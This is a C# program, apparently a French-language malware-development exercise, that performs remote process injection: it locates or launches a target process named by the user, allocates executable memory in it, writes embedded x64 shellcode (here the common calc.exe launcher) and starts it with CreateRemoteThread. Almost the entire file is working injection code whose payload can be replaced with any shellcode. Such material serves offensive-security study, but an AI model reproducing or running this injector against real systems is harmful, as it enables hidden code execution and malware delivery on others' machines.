using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Threading; // Ajouté pour le Thread.Sleep

namespace maldev_or_olinet
{
    class Program
    {
        // Déclarations des API Windows (P/Invoke) nécessaires
        [Flags] public enum ProcessAccessFlags : uint { All = 0x001F0FFF }
        [DllImport("kernel32.dll", SetLastError = true)] public static extern IntPtr OpenProcess(ProcessAccessFlags access, bool inherit, int pid);
        [Flags] public enum AllocType { Commit = 0x1000, Reserve = 0x2000 }
        [Flags] public enum MemProtect { ExecuteReadWrite = 0x40 }
        [DllImport("kernel32.dll", SetLastError = true)] static extern IntPtr VirtualAllocEx(IntPtr hProc, IntPtr addr, uint size, AllocType type, MemProtect protect);
        [DllImport("kernel32.dll", SetLastError = true)] public static extern bool WriteProcessMemory(IntPtr hProc, IntPtr baseAddr, byte[] buffer, int size, out IntPtr written);
        [DllImport("kernel32.dll")] static extern IntPtr CreateRemoteThread(IntPtr hProc, IntPtr attr, uint stack, IntPtr start, IntPtr param, uint flags, IntPtr id);
        [DllImport("kernel32.dll", SetLastError = true)] public static extern bool CloseHandle(IntPtr handle);
        [DllImport("kernel32.dll", SetLastError = true)] public static extern UInt32 WaitForSingleObject(IntPtr handle, Int32 ms);

        public static void Main()
        {
            // Shellcode d'origine du fichier exo 2
            byte[] sc = new byte[276] {0xfc,0x48,0x83,0xe4,0xf0,0xe8,
            0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,
            0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
            0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,
            0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,
            0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,
            0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,
            0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
            0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,
            0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,
            0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,
            0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,
            0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
            0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,
            0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,
            0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,
            0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,
            0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,
            0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,
            0x31,0x8b,0x6f,0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,
            0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,
            0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,
            0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,
            0x63,0x2e,0x65,0x78,0x65,0x00};
            int len = sc.Length;

            // --- DEBUT DES MODIFICATIONS ---

            Console.Write("Entrez le nom du processus cible (ex: notepad) : ");
            string targetInput = Console.ReadLine();

            // sécurité/cast : si l'utilisateur entre "notepad.exe", on enlève le .exe pour la recherche
            // GetProcessesByName cherche sans l'extension.
            string targetNameForSearch = targetInput.Replace(".exe", "");

            int pid = 0;

            // 1. On cherche si le processus existe déjà
            Process[] procs = Process.GetProcessesByName(targetNameForSearch);

            if (procs.Length > 0)
            {
                // Le processus existe, on prend le premier trouvé
                pid = procs[0].Id;
                Console.WriteLine($"[+] Processus '{targetNameForSearch}' trouvé avec le PID : {pid}");
            }
            else
            {
                // 2. Le processus n'existe pas, on le crée
                Console.WriteLine($"[-] Processus '{targetInput}' introuvable. Tentative de création...");

                try
                {
                    // On démarre le processus
                    Process p = Process.Start(targetInput);

                    // On attend un court instant pour être sûr que le PID est attribué
                    if (p != null)
                    {
                        // WaitForInputIdle force le programme à attendre que le processus graphique soit prêt
                        p.WaitForInputIdle();
                        pid = p.Id;
                        Console.WriteLine($"[+] Processus créé avec succès. PID : {pid}");
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[!] Erreur lors de la création du processus : {ex.Message}");
                    return; // On arrête tout si on ne peut pas créer la cible
                }
            }



            // Suite de l'injection qui utilise la variable 'pid' dynamique
            Console.WriteLine($"[*] Début de l'injection dans PID {pid}...");

            IntPtr hProc = OpenProcess(ProcessAccessFlags.All, false, pid);
            if (hProc == IntPtr.Zero) { Console.WriteLine($"OpenProcess fail: {Marshal.GetLastWin32Error()}"); return; }

            IntPtr mem = VirtualAllocEx(hProc, IntPtr.Zero, (uint)len, AllocType.Commit | AllocType.Reserve, MemProtect.ExecuteReadWrite);
            if (mem == IntPtr.Zero) { Console.WriteLine($"AllocEx fail: {Marshal.GetLastWin32Error()}"); CloseHandle(hProc); return; }

            IntPtr written;
            if (!WriteProcessMemory(hProc, mem, sc, len, out written)) { Console.WriteLine($"Write fail: {Marshal.GetLastWin32Error()}"); CloseHandle(hProc); return; }
            Console.WriteLine($"Wrote {written} bytes");

            IntPtr thread = CreateRemoteThread(hProc, IntPtr.Zero, 0, mem, IntPtr.Zero, 0, IntPtr.Zero);
            if (thread == IntPtr.Zero) { Console.WriteLine($"RemoteThread fail: {Marshal.GetLastWin32Error()}"); CloseHandle(hProc); return; }

            WaitForSingleObject(thread, -1);
            CloseHandle(hProc); CloseHandle(thread);
            Console.WriteLine("Injection done. Calc opened?");
            Console.ReadLine();
        }
    }
}
